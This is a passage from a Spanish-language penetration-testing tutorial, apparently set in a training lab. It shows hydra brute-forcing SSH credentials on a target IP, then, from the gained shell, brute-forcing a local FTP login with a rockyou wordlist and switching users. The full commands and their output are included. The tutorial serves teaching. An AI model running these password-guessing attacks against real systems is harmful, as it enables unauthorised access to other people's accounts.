El comando utilizado para atacar un servicio de login es bastante sencillo. Simplemente tenemos que proporcionar las wordlists de nombre de usuario/contraseña y agregar `service://SERVER_IP:PORT` al final. Como de costumbre, añadiremos los flags `-u -f`. Finalmente, cuando ejecutemos el comando por primera vez, `hydra` sugerirá que añadamos el flag `-t 4` para un número máximo de intentos paralelos, ya que muchos `SSH` limitan el número de conexiones paralelas y descartan otras conexiones, lo que resulta en muchos de nuestros intentos siendo descartados. Nuestro comando final debería ser el siguiente:

```r
hydra -L bill.txt -P william.txt -u -f ssh://178.35.49.134:22 -t 4

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra)
[DATA] max 4 tasks per 1 server, overall 4 tasks, 157116 login tries (l:12/p:13093), ~39279 tries per task
[DATA] attacking ssh://178.35.49.134:22/
[STATUS] 77.00 tries/min, 77 tries in 00:01h, 157039 to do in 33:60h, 4 active
[PORT][ssh] host: 178.35.49.134   login: b.gates   password: ...SNIP...
[STATUS] attack finished for 178.35.49.134 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra)
```

Vemos que toma algún tiempo terminar, pero eventualmente, obtenemos un par funcional y identificamos al usuario `b.gates`. Ahora, podemos intentar iniciar sesión por SSH utilizando las credenciales que obtuvimos:

```r
ssh b.gates@178.35.49.134 -p 22

b.gates@SERVER_IP's password: ********

b.gates@bruteforcing:~$ whoami
b.gates
```

Como podemos ver, podemos iniciar sesión por `SSH` y obtener un shell en el servidor.

---

## FTP Brute Forcing

Una vez que estamos dentro, podemos verificar qué otros usuarios están en el sistema:

```r
b.gates@bruteforcing:~$ ls /home

b.gates  m.gates
```

Notamos otro usuario, `m.gates`. También notamos en nuestro `recon` local que el puerto `21` está abierto localmente, lo que indica que debe haber un `FTP` disponible:

```r
b.gates@bruteforcing:~$ netstat -antp | grep -i list

(No info could be read for "-p": geteuid()=1000 but you should be root.)
tcp        0      0 127.0.0.1:21            0.0.0.0:*               LISTEN      - 
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -                  
```

A continuación, podemos intentar realizar un brute force en el inicio de sesión `FTP` para el usuario `m.gates`.

Nota 1: A veces, los administradores prueban sus medidas y políticas de seguridad con diferentes herramientas. En este caso, el administrador de este servidor web mantuvo "hydra" instalado. Podemos beneficiarnos de esto y usarlo contra el sistema local atacando el servicio FTP localmente o remotamente.

Nota 2: "rockyou-10.txt" se puede encontrar en "/opt/useful/SecLists/Passwords/Leaked-Databases/rockyou-10.txt", que contiene un total de 92 contraseñas. Esta es una versión más corta de "rockyou.txt" que incluye 14,344,391 contraseñas.

Así que, de manera similar a cómo atacamos el servicio `SSH`, podemos realizar un ataque similar en `FTP`:

```r
b.gates@bruteforcing:~$ hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1

Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra)
[DATA] max 16 tasks per 1 server, overall 16 tasks, 92 login tries (l:1/p:92), ~6 tries per task
[DATA] attacking ftp://127.0.0.1:21/

[21][ftp] host: 127.0.0.1   login: m.gates   password: <...SNIP...>
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra)
```

Ahora podemos intentar conectarnos por `FTP` como ese usuario, o incluso cambiar a ese usuario. Vamos a intentar ambas cosas:

```r
b.gates@bruteforcing:~$ ftp 127.0.0.1

Connected to 127.0.0.1.
220 (vsFTPd 3.0.3)
Name (127.0.0.1:b.gates): m.gates

331 Please specify the password.
Password: 

230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir

200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-------    1 1001     1001           33 Sep 11 00:06 flag.txt
226 Directory send OK.
```

Y para cambiar a ese usuario:

```r
b.gates@bruteforcing:~$ su - m.gates

Password: *********
m.gates@bruteforcing:~$
```

```r
m.gates@bruteforcing:~$ whoami

m.gates
```